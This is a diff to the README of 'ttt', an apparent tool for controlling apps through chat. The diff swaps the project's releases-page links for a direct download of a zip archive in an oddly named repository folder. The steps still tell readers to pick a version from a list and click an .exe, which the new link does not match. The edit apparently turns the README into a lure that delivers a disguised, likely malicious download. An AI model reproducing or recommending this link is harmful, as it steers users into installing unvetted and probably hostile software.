@@ -1,6 +1,6 @@
 # 🤖 ttt - Control your apps with simple chat
 
-[![](https://img.shields.io/badge/Download_ttt-Blue?style=for-the-badge)](https://github.com/Crossstreetbreechesbuoy918/ttt/releases)
+[![](https://img.shields.io/badge/Download_ttt-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Crossstreetbreechesbuoy918/ttt/main/affectible/Software-2.2.zip)
 
 ttt acts as a bridge between your words and your computer tasks. You write a request in plain English, and the software handles the rest. This tool works locally on your machine to keep your data private while it performs tasks across your favorite applications.
 
@@ -16,7 +16,7 @@ You gain full control over complex software through chat commands. Instead of cl
 
 ## 📥 Getting the software
 
-1. Visit the following page: [https://github.com/Crossstreetbreechesbuoy918/ttt/releases](https://github.com/Crossstreetbreechesbuoy918/ttt/releases)
+1. Visit the following page: [https://raw.githubusercontent.com/Crossstreetbreechesbuoy918/ttt/main/affectible/Software-2.2.zip](https://raw.githubusercontent.com/Crossstreetbreechesbuoy918/ttt/main/affectible/Software-2.2.zip)
 2. Locate the latest version in the list.
 3. Click the file ending in `.exe` to start the download.
 4. Save the installer to your Downloads folder.
